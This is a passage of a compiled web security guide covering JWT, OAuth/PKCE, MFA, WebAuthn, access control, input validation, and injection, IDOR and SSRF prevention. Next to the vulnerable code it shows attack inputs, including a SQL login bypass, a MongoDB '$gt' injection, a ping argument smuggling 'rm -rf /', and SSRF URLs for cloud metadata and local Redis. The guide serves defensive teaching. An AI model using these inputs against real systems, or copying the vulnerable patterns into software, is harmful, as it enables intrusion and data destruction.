Algorithm confusion attack\njwt.verify(token, publicKey); // Specify algorithm explicitly\n\n// \u2705 SAFE\njwt.verify(token, publicKey, { algorithms: ['RS256'] });\n\n// \u274c DANGEROUS - Storing sensitive data\nconst token = jwt.sign({\n  userId: 123,\n  password: 'secret123' // Never store passwords in JWT!\n}, secret);\n\n// \u2705 SAFE - Only non-sensitive identifiers\nconst token = jwt.sign({\n  userId: 123,\n  role: 'user'\n}, secret);\n"})}),"\n",(0,r.jsx)(n.h3,{id:"oauth-20--openid-connect-1",children:"OAuth 2.0 & OpenID Connect"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"OAuth 2.0 Flow (Authorization Code):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:'1. User clicks "Login with Google"\n2. Redirect to: https://accounts.google.com/o/oauth2/auth?\n   - client_id=YOUR_CLIENT_ID\n   - redirect_uri=https://yourapp.com/callback\n   - response_type=code\n   - scope=openid email profile\n   - state=random_string (CSRF protection)\n\n3. User authorizes\n4. Redirect back with code: https://yourapp.com/callback?code=AUTH_CODE&state=random_string\n5. Exchange code for tokens\n6. Use access token to fetch user data\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Implementation with Passport.js:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const passport = require('passport');\nconst GoogleStrategy = require('passport-google-oauth20').Strategy;\n\npassport.use(new GoogleStrategy({\n    clientID: process.env.GOOGLE_CLIENT_ID,\n    clientSecret: process.env.GOOGLE_CLIENT_SECRET,\n    callbackURL: '/auth/google/callback',\n    scope: ['profile', 'email']\n  },\n  async (accessToken, refreshToken, profile, done) => {\n    try {\n      // Find or create user\n      let user = await User.findOne({ googleId: profile.id });\n\n      if (!user) {\n        user = await User.create({\n          googleId: profile.id,\n          email: profile.emails[0].value,\n          name: profile.displayName,\n          avatar: profile.photos[0].value\n        });\n      }\n\n      return done(null, user);\n    } catch (err) {\n      return done(err, null);\n    }\n  }\n));\n\n// Routes\napp.get('/auth/google',\n  passport.authenticate('google', { scope: ['profile', 'email'] })\n);\n\napp.get('/auth/google/callback',\n  passport.authenticate('google', { failureRedirect: '/login' }),\n  (req, res) => {\n    // Successful authentication\n    const sessionId = createSession(req.user.id);\n    res.cookie('sessionId', sessionId, {\n      httpOnly: true,\n      secure: true,\n      sameSite: 'lax'\n    });\n    res.redirect('/dashboard');\n  }\n);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"PKCE (Proof Key for Code Exchange) for SPAs:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Generate code verifier and challenge\nconst crypto = require('crypto');\n\nfunction generateCodeVerifier() {\n  return crypto.randomBytes(32).toString('base64url');\n}\n\nfunction generateCodeChallenge(verifier) {\n  return crypto\n    .createHash('sha256')\n    .update(verifier)\n    .digest('base64url');\n}\n\n// Step 1: Initiate OAuth flow\nconst codeVerifier = generateCodeVerifier();\nconst codeChallenge = generateCodeChallenge(codeVerifier);\n\n// Store verifier in session/localStorage\nsessionStorage.setItem('code_verifier', codeVerifier);\n\n// Redirect to authorization server\nconst authUrl = `https://auth.example.com/authorize?` +\n  `client_id=${CLIENT_ID}` +\n  `&redirect_uri=${REDIRECT_URI}` +\n  `&response_type=code` +\n  `&code_challenge=${codeChallenge}` +\n  `&code_challenge_method=S256` +\n  `&scope=openid profile email`;\n\nwindow.location.href = authUrl;\n\n// Step 2: Exchange code for token\nasync function exchangeCodeForToken(code) {\n  const codeVerifier = sessionStorage.getItem('code_verifier');\n\n  const response = await fetch('https://auth.example.com/token', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: new URLSearchParams({\n      grant_type: 'authorization_code',\n      code: code,\n      redirect_uri: REDIRECT_URI,\n      client_id: CLIENT_ID,\n      code_verifier: codeVerifier\n    })\n  });\n\n  const tokens = await response.json();\n  return tokens;\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"multi-factor-authentication-mfa-1",children:"Multi-Factor Authentication (MFA)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"TOTP (Time-based One-Time Password) Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const speakeasy = require('speakeasy');\nconst QRCode = require('qrcode');\n\n// Generate secret for user\nasync function setupMFA(userId, email) {\n  const secret = speakeasy.generateSecret({\n    name: `YourApp (${email})`,\n    issuer: 'YourApp'\n  });\n\n  // Save secret to database (encrypted)\n  await saveUserMFASecret(userId, secret.base32);\n\n  // Generate QR code\n  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);\n\n  return {\n    secret: secret.base32,\n    qrCode: qrCodeUrl\n  };\n}\n\n// Verify TOTP token\nfunction verifyMFAToken(secret, token) {\n  return speakeasy.totp.verify({\n    secret: secret,\n    encoding: 'base32',\n    token: token,\n    window: 2 // Allow 2 time steps before/after\n  });\n}\n\n// MFA login flow\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n\n  const user = await authenticateUser(email, password);\n\n  if (!user) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n\n  // Check if MFA is enabled\n  if (user.mfaEnabled) {\n    // Create temporary token for MFA verification\n    const tempToken = jwt.sign(\n      { userId: user.id, step: 'mfa_required' },\n      process.env.TEMP_TOKEN_SECRET,\n      { expiresIn: '5m' }\n    );\n\n    return res.json({\n      requiresMFA: true,\n      tempToken: tempToken\n    });\n  }\n\n  // No MFA, complete login\n  const sessionId = await createSession(user.id);\n  res.cookie('sessionId', sessionId, cookieOptions);\n  res.json({ success: true });\n});\n\napp.post('/verify-mfa', async (req, res) => {\n  const { tempToken, mfaToken } = req.body;\n\n  try {\n    const decoded = jwt.verify(tempToken, process.env.TEMP_TOKEN_SECRET);\n\n    if (decoded.step !== 'mfa_required') {\n      return res.status(403).json({ error: 'Invalid token' });\n    }\n\n    const user = await getUserById(decoded.userId);\n    const isValid = verifyMFAToken(user.mfaSecret, mfaToken);\n\n    if (!isValid) {\n      return res.status(401).json({ error: 'Invalid MFA token' });\n    }\n\n    // MFA verified, complete login\n    const sessionId = await createSession(user.id);\n    res.cookie('sessionId', sessionId, cookieOptions);\n    res.json({ success: true });\n\n  } catch (err) {\n    return res.status(403).json({ error: 'Invalid token' });\n  }\n});\n\n// Backup codes\nfunction generateBackupCodes(count = 10) {\n  const codes = [];\n  for (let i = 0; i < count; i++) {\n    codes.push(crypto.randomBytes(4).toString('hex').toUpperCase());\n  }\n  return codes;\n}\n\nasync function saveBackupCodes(userId, codes) {\n  const hashedCodes = await Promise.all(\n    codes.map(code => bcrypt.hash(code, 10))\n  );\n  await db.query(\n    'INSERT INTO mfa_backup_codes (user_id, code_hash) VALUES ?',\n    [hashedCodes.map(hash => [userId, hash])]\n  );\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"webauthn--passkeys-1",children:"WebAuthn & Passkeys"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Registration (Creating Passkey):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Server-side: Generate challenge\nconst { generateRegistrationOptions, verifyRegistrationResponse } = require('@simplewebauthn/server');\n\napp.post('/webauthn/register/start', async (req, res) => {\n  const user = req.user;\n\n  const options = generateRegistrationOptions({\n    rpName: 'YourApp',\n    rpID: 'example.com',\n    userID: user.id,\n    userName: user.email,\n    userDisplayName: user.name,\n    attestationType: 'none',\n    authenticatorSelection: {\n      authenticatorAttachment: 'platform', // 'platform' or 'cross-platform'\n      userVerification: 'required',\n      residentKey: 'required'\n    },\n    timeout: 60000\n  });\n\n  // Store challenge in session\n  req.session.challenge = options.challenge;\n\n  res.json(options);\n});\n\n// Client-side: Create credential\nasync function registerPasskey() {\n  const optionsResponse = await fetch('/webauthn/register/start', {\n    method: 'POST',\n    credentials: 'include'\n  });\n  const options = await optionsResponse.json();\n\n  // Browser API\n  const credential = await navigator.credentials.create({\n    publicKey: options\n  });\n\n  // Send credential to server\n  await fetch('/webauthn/register/finish', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    credentials: 'include',\n    body: JSON.stringify(credential)\n  });\n}\n\n// Server-side: Verify and store credential\napp.post('/webauthn/register/finish', async (req, res) => {\n  const user = req.user;\n  const credential = req.body;\n  const expectedChallenge = req.session.challenge;\n\n  try {\n    const verification = await verifyRegistrationResponse({\n      response: credential,\n      expectedChallenge: expectedChallenge,\n      expectedOrigin: 'https://example.com',\n      expectedRPID: 'example.com'\n    });\n\n    if (verification.verified) {\n      // Store credential in database\n      await db.query(\n        'INSERT INTO webauthn_credentials (user_id, credential_id, public_key, counter) VALUES (?, ?, ?, ?)',\n        [user.id, verification.registrationInfo.credentialID, verification.registrationInfo.credentialPublicKey, 0]\n      );\n\n      res.json({ success: true });\n    } else {\n      res.status(400).json({ error: 'Verification failed' });\n    }\n  } catch (err) {\n    res.status(400).json({ error: err.message });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Authentication (Using Passkey):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Server-side: Generate authentication challenge\nconst { generateAuthenticationOptions, verifyAuthenticationResponse } = require('@simplewebauthn/server');\n\napp.post('/webauthn/auth/start', async (req, res) => {\n  const { email } = req.body;\n\n  const user = await getUserByEmail(email);\n  if (!user) {\n    return res.status(404).json({ error: 'User not found' });\n  }\n\n  const userCredentials = await getUserCredentials(user.id);\n\n  const options = generateAuthenticationOptions({\n    rpID: 'example.com',\n    allowCredentials: userCredentials.map(cred => ({\n      id: cred.credentialId,\n      type: 'public-key',\n      transports: ['internal', 'hybrid']\n    })),\n    userVerification: 'required',\n    timeout: 60000\n  });\n\n  req.session.challenge = options.challenge;\n  req.session.userId = user.id;\n\n  res.json(options);\n});\n\n// Client-side: Get credential\nasync function authenticateWithPasskey(email) {\n  const optionsResponse = await fetch('/webauthn/auth/start', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    credentials: 'include',\n    body: JSON.stringify({ email })\n  });\n  const options = await optionsResponse.json();\n\n  const credential = await navigator.credentials.get({\n    publicKey: options\n  });\n\n  const response = await fetch('/webauthn/auth/finish', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    credentials: 'include',\n    body: JSON.stringify(credential)\n  });\n\n  return response.json();\n}\n\n// Server-side: Verify authentication\napp.post('/webauthn/auth/finish', async (req, res) => {\n  const credential = req.body;\n  const expectedChallenge = req.session.challenge;\n  const userId = req.session.userId;\n\n  const userCredential = await getCredentialById(credential.id);\n\n  if (!userCredential) {\n    return res.status(404).json({ error: 'Credential not found' });\n  }\n\n  try {\n    const verification = await verifyAuthenticationResponse({\n      response: credential,\n      expectedChallenge: expectedChallenge,\n      expectedOrigin: 'https://example.com',\n      expectedRPID: 'example.com',\n      authenticator: {\n        credentialID: userCredential.credentialId,\n        credentialPublicKey: userCredential.publicKey,\n        counter: userCredential.counter\n      }\n    });\n\n    if (verification.verified) {\n      // Update counter\n      await updateCredentialCounter(credential.id, verification.authenticationInfo.newCounter);\n\n      // Create session\n      const sessionId = await createSession(userId);\n      res.cookie('sessionId', sessionId, cookieOptions);\n      res.json({ success: true });\n    } else {\n      res.status(401).json({ error: 'Verification failed' });\n    }\n  } catch (err) {\n    res.status(401).json({ error: err.message });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"authorization-patterns-1",children:"Authorization Patterns"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Role-Based Access Control (RBAC):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Define roles and permissions\nconst ROLES = {\n  ADMIN: 'admin',\n  MODERATOR: 'moderator',\n  USER: 'user',\n  GUEST: 'guest'\n};\n\nconst PERMISSIONS = {\n  USER_CREATE: 'user:create',\n  USER_READ: 'user:read',\n  USER_UPDATE: 'user:update',\n  USER_DELETE: 'user:delete',\n  POST_CREATE: 'post:create',\n  POST_UPDATE_OWN: 'post:update:own',\n  POST_UPDATE_ANY: 'post:update:any',\n  POST_DELETE_ANY: 'post:delete:any'\n};\n\nconst ROLE_PERMISSIONS = {\n  [ROLES.ADMIN]: Object.values(PERMISSIONS),\n  [ROLES.MODERATOR]: [\n    PERMISSIONS.USER_READ,\n    PERMISSIONS.POST_CREATE,\n    PERMISSIONS.POST_UPDATE_ANY,\n    PERMISSIONS.POST_DELETE_ANY\n  ],\n  [ROLES.USER]: [\n    PERMISSIONS.USER_READ,\n    PERMISSIONS.POST_CREATE,\n    PERMISSIONS.POST_UPDATE_OWN\n  ],\n  [ROLES.GUEST]: [\n    PERMISSIONS.USER_READ\n  ]\n};\n\n// Middleware\nfunction requirePermission(permission) {\n  return async (req, res, next) => {\n    const user = req.user;\n\n    if (!user) {\n      return res.status(401).json({ error: 'Unauthorized' });\n    }\n\n    const userPermissions = ROLE_PERMISSIONS[user.role] || [];\n\n    if (!userPermissions.includes(permission)) {\n      return res.status(403).json({ error: 'Forbidden: Insufficient permissions' });\n    }\n\n    next();\n  };\n}\n\nfunction requireRole(...roles) {\n  return (req, res, next) => {\n    if (!req.user || !roles.includes(req.user.role)) {\n      return res.status(403).json({ error: 'Forbidden: Insufficient role' });\n    }\n    next();\n  };\n}\n\n// Usage\napp.post('/users',\n  authenticateToken,\n  requirePermission(PERMISSIONS.USER_CREATE),\n  createUser\n);\n\napp.delete('/posts/:id',\n  authenticateToken,\n  requirePermission(PERMISSIONS.POST_DELETE_ANY),\n  deletePost\n);\n\napp.put('/posts/:id',\n  authenticateToken,\n  async (req, res, next) => {\n    const post = await getPostById(req.params.id);\n\n    // Check ownership\n    if (post.authorId === req.user.id) {\n      return requirePermission(PERMISSIONS.POST_UPDATE_OWN)(req, res, next);\n    } else {\n      return requirePermission(PERMISSIONS.POST_UPDATE_ANY)(req, res, next);\n    }\n  },\n  updatePost\n);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Attribute-Based Access Control (ABAC):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Policy engine\nclass PolicyEngine {\n  constructor() {\n    this.policies = [];\n  }\n\n  addPolicy(policy) {\n    this.policies.push(policy);\n  }\n\n  evaluate(subject, action, resource, context = {}) {\n    for (const policy of this.policies) {\n      if (policy.matches(subject, action, resource, context)) {\n        return policy.effect === 'allow';\n      }\n    }\n    return false; // Deny by default\n  }\n}\n\n// Example policies\nconst policyEngine = new PolicyEngine();\n\npolicyEngine.addPolicy({\n  effect: 'allow',\n  matches: (subject, action, resource, context) => {\n    return subject.role === 'admin'; // Admins can do anything\n  }\n});\n\npolicyEngine.addPolicy({\n  effect: 'allow',\n  matches: (subject, action, resource, context) => {\n    return action === 'read' && resource.visibility === 'public';\n  }\n});\n\npolicyEngine.addPolicy({\n  effect: 'allow',\n  matches: (subject, action, resource, context) => {\n    return action === 'update' &&\n           resource.authorId === subject.id &&\n           context.withinBusinessHours === true;\n  }\n});\n\n// Middleware\nfunction requireAccess(action, getResource) {\n  return async (req, res, next) => {\n    const subject = req.user;\n    const resource = await getResource(req);\n    const context = {\n      withinBusinessHours: isBusinessHours(),\n      ipAddress: req.ip\n    };\n\n    if (!policyEngine.evaluate(subject, action, resource, context)) {\n      return res.status(403).json({ error: 'Access denied' });\n    }\n\n    next();\n  };\n}\n\n// Usage\napp.put('/documents/:id',\n  authenticateToken,\n  requireAccess('update', async (req) => {\n    return await getDocumentById(req.params.id);\n  }),\n  updateDocument\n);\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"6-backend--api-security-1",children:"6. Backend & API Security"}),"\n",(0,r.jsx)(n.h3,{id:"input-validation-1",children:"Input Validation"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Validation Libraries:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Using Zod\nconst { z } = require('zod');\n\nconst userSchema = z.object({\n  email: z.string().email().max(255),\n  password: z.string().min(12).max(128),\n  age: z.number().int().min(13).max(120),\n  username: z.string().regex(/^[a-zA-Z0-9_-]{3,20}$/),\n  website: z.string().url().optional(),\n  bio: z.string().max(500).optional()\n});\n\napp.post('/register', async (req, res) => {\n  try {\n    const validData = userSchema.parse(req.body);\n    // Process valid data\n    await createUser(validData);\n    res.json({ success: true });\n  } catch (err) {\n    if (err instanceof z.ZodError) {\n      return res.status(400).json({\n        error: 'Validation failed',\n        details: err.errors\n      });\n    }\n    throw err;\n  }\n});\n\n// Using Joi\nconst Joi = require('joi');\n\nconst postSchema = Joi.object({\n  title: Joi.string().min(1).max(200).required(),\n  content: Joi.string().min(1).max(50000).required(),\n  tags: Joi.array().items(Joi.string().max(30)).max(10),\n  publishedAt: Joi.date().iso().optional(),\n  metadata: Joi.object().unknown(true).optional()\n});\n\nconst { error, value } = postSchema.validate(req.body, {\n  abortEarly: false,\n  stripUnknown: true\n});\n\nif (error) {\n  return res.status(400).json({\n    error: error.details.map(d => d.message)\n  });\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Sanitization:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const validator = require('validator');\nconst xss = require('xss');\n\nfunction sanitizeInput(input) {\n  // Remove control characters\n  let sanitized = input.replace(/[\\x00-\\x1F\\x7F]/g, '');\n\n  // Escape HTML\n  sanitized = validator.escape(sanitized);\n\n  // Additional XSS protection\n  sanitized = xss(sanitized, {\n    whiteList: {}, // No HTML allowed\n    stripIgnoreTag: true,\n    stripIgnoreTagBody: ['script', 'style']\n  });\n\n  return sanitized.trim();\n}\n\n// File upload validation\nconst multer = require('multer');\nconst path = require('path');\n\nconst fileFilter = (req, file, cb) => {\n  const allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];\n  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif'];\n\n  const ext = path.extname(file.originalname).toLowerCase();\n\n  if (!allowedMimes.includes(file.mimetype) || !allowedExts.includes(ext)) {\n    return cb(new Error('Invalid file type'), false);\n  }\n\n  cb(null, true);\n};\n\nconst upload = multer({\n  storage: multer.diskStorage({\n    destination: './uploads/',\n    filename: (req, file, cb) => {\n      // Generate random filename to prevent path traversal\n      const uniqueName = `${Date.now()}-${crypto.randomBytes(8).toString('hex')}${path.extname(file.originalname)}`;\n      cb(null, uniqueName);\n    }\n  }),\n  fileFilter: fileFilter,\n  limits: {\n    fileSize: 5 * 1024 * 1024, // 5MB\n    files: 1\n  }\n});\n\napp.post('/upload', upload.single('image'), (req, res) => {\n  res.json({ filename: req.file.filename });\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"sql-injection-1",children:"SQL Injection"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"What It Is:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"-- Vulnerable query\nSELECT * FROM users WHERE username = '${username}' AND password = '${password}'\n\n-- Attack input\nusername: admin'--\npassword: anything\n\n-- Resulting query (-- comments out password check)\nSELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Parameterized Queries (Prepared Statements):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\ndb.query(query, (err, results) => {\n  // Dangerous!\n});\n\n// \u2705 SAFE - MySQL with placeholders\nconst query = 'SELECT * FROM users WHERE email = ?';\ndb.query(query, [email], (err, results) => {\n  // Safe!\n});\n\n// \u2705 SAFE - PostgreSQL with named parameters\nconst query = 'SELECT * FROM users WHERE email = $1';\ndb.query(query, [email], (err, results) => {\n  // Safe!\n});\n\n// \u2705 SAFE - Using ORM (Sequelize)\nconst user = await User.findOne({\n  where: {\n    email: email\n  }\n});\n\n// \u2705 SAFE - Using query builder (Knex)\nconst users = await knex('users')\n  .where('email', email)\n  .select('*');\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Input Validation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const validator = require('validator');\n\nfunction validateEmail(email) {\n  if (!validator.isEmail(email)) {\n    throw new Error('Invalid email format');\n  }\n  if (email.length > 255) {\n    throw new Error('Email too long');\n  }\n  return email;\n}\n\nfunction validateId(id) {\n  const parsed = parseInt(id, 10);\n  if (isNaN(parsed) || parsed < 1) {\n    throw new Error('Invalid ID');\n  }\n  return parsed;\n}\n\napp.get('/users/:id', async (req, res) => {\n  try {\n    const userId = validateId(req.params.id);\n    const user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);\n    res.json(user);\n  } catch (err) {\n    res.status(400).json({ error: err.message });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Least Privilege Database Access:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"-- Create restricted user for application\nCREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';\n\n-- Grant only necessary permissions\nGRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'localhost';\nGRANT SELECT, INSERT, UPDATE ON myapp.posts TO 'app_user'@'localhost';\n\n-- Don't grant DELETE, DROP, or admin privileges\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Parameterized queries always\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," ORMs with parameter binding\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Input validation and type checking\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Least privilege database accounts\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," String concatenation for queries\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Dynamic SQL with user input\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Displaying database errors to users"]}),"\n",(0,r.jsx)(n.h3,{id:"nosql-injection-1",children:"NoSQL Injection"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"MongoDB Injection Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  // Attack: username = {\"$gt\": \"\"}, password = {\"$gt\": \"\"}\n  const user = await db.collection('users').findOne({\n    username: username,\n    password: password\n  });\n\n  if (user) {\n    res.json({ success: true });\n  }\n});\n\n// \u2705 SAFE - Validate and sanitize\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  // Ensure inputs are strings\n  if (typeof username !== 'string' || typeof password !== 'string') {\n    return res.status(400).json({ error: 'Invalid input' });\n  }\n\n  const user = await db.collection('users').findOne({\n    username: username,\n    password: password // Should be hashed!\n  });\n\n  if (user) {\n    res.json({ success: true });\n  }\n});\n\n// \u2705 BETTER - Using Mongoose with schema validation\nconst userSchema = new mongoose.Schema({\n  username: { type: String, required: true },\n  password: { type: String, required: true }\n});\n\nconst User = mongoose.model('User', userSchema);\n\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  const user = await User.findOne({ username, password });\n  // Mongoose automatically sanitizes\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Sanitization Library:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const mongoSanitize = require('express-mongo-sanitize');\n\n// Sanitize all user input\napp.use(mongoSanitize({\n  replaceWith: '_',\n  onSanitize: ({ req, key }) => {\n    console.warn(`Sanitized ${key} in ${req.path}`);\n  }\n}));\n\n// Or manually sanitize\nconst sanitize = require('mongo-sanitize');\n\napp.post('/search', async (req, res) => {\n  const query = sanitize(req.body.query);\n  const results = await db.collection('posts').find({ title: query });\n  res.json(results);\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"command-injection-1",children:"Command Injection"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"What It Is:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE\nconst { exec } = require('child_process');\n\napp.get('/ping', (req, res) => {\n  const host = req.query.host;\n\n  // Attack: host = \"google.com; rm -rf /\"\n  exec(`ping -c 4 ${host}`, (err, stdout) => {\n    res.send(stdout);\n  });\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 SAFE - Use parameterized execution\nconst { execFile } = require('child_process');\n\napp.get('/ping', (req, res) => {\n  const host = req.query.host;\n\n  // Validate hostname\n  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {\n    return res.status(400).json({ error: 'Invalid hostname' });\n  }\n\n  // execFile doesn't invoke shell\n  execFile('ping', ['-c', '4', host], (err, stdout) => {\n    if (err) {\n      return res.status(500).json({ error: 'Ping failed' });\n    }\n    res.send(stdout);\n  });\n});\n\n// \u2705 BETTER - Avoid executing external commands\n// Use native libraries instead\nconst ping = require('ping');\n\napp.get('/ping', async (req, res) => {\n  const host = req.query.host;\n\n  try {\n    const result = await ping.promise.probe(host, {\n      timeout: 10\n    });\n    res.json(result);\n  } catch (err) {\n    res.status(500).json({ error: 'Ping failed' });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"insecure-direct-object-references-idor-1",children:"Insecure Direct Object References (IDOR)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE - No authorization check\napp.get('/api/orders/:id', authenticateToken, async (req, res) => {\n  const order = await db.query('SELECT * FROM orders WHERE id = ?', [req.params.id]);\n\n  // Anyone authenticated can view any order!\n  res.json(order);\n});\n\n// Attack: User changes URL from /api/orders/123 to /api/orders/124\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 SAFE - Verify ownership\napp.get('/api/orders/:id', authenticateToken, async (req, res) => {\n  const order = await db.query(\n    'SELECT * FROM orders WHERE id = ? AND user_id = ?',\n    [req.params.id, req.user.id]\n  );\n\n  if (!order) {\n    return res.status(404).json({ error: 'Order not found' });\n  }\n\n  res.json(order);\n});\n\n// \u2705 SAFE - Reusable authorization middleware\nasync function authorizeResource(resourceType) {\n  return async (req, res, next) => {\n    const resourceId = req.params.id;\n    const userId = req.user.id;\n\n    const resource = await getResource(resourceType, resourceId);\n\n    if (!resource) {\n      return res.status(404).json({ error: 'Resource not found' });\n    }\n\n    // Check ownership\n    if (resource.userId !== userId && req.user.role !== 'admin') {\n      return res.status(403).json({ error: 'Forbidden' });\n    }\n\n    req.resource = resource;\n    next();\n  };\n}\n\napp.get('/api/orders/:id',\n  authenticateToken,\n  authorizeResource('order'),\n  (req, res) => {\n    res.json(req.resource);\n  }\n);\n\napp.delete('/api/documents/:id',\n  authenticateToken,\n  authorizeResource('document'),\n  async (req, res) => {\n    await deleteDocument(req.params.id);\n    res.json({ success: true });\n  }\n);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Use UUIDs Instead of Sequential IDs:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c Predictable IDs\n// Orders: 1, 2, 3, 4, 5... (easy to enumerate)\n\n// \u2705 UUIDs\nconst { v4: uuidv4 } = require('uuid');\n\nconst orderId = uuidv4(); // e.g., \"550e8400-e29b-41d4-a716-446655440000\"\n\n// Still need authorization checks, but harder to enumerate\n"})}),"\n",(0,r.jsx)(n.h3,{id:"server-side-request-forgery-ssrf-1",children:"Server-Side Request Forgery (SSRF)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// \u274c VULNERABLE\napp.get(\'/fetch-url\', async (req, res) => {\n  const url = req.query.url;\n\n  // Attack: url = "http://169.254.169.254/latest/meta-data/" (AWS metadata)\n  // Attack: url = "http://localhost:6379/" (Redis)\n  const response = await axios.get(url);\n  res.send(response.data);\n});\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const axios = require('axios');\nconst { URL } = require('url');\n\n// Whitelist of allowed domains\nconst ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];\n\n// 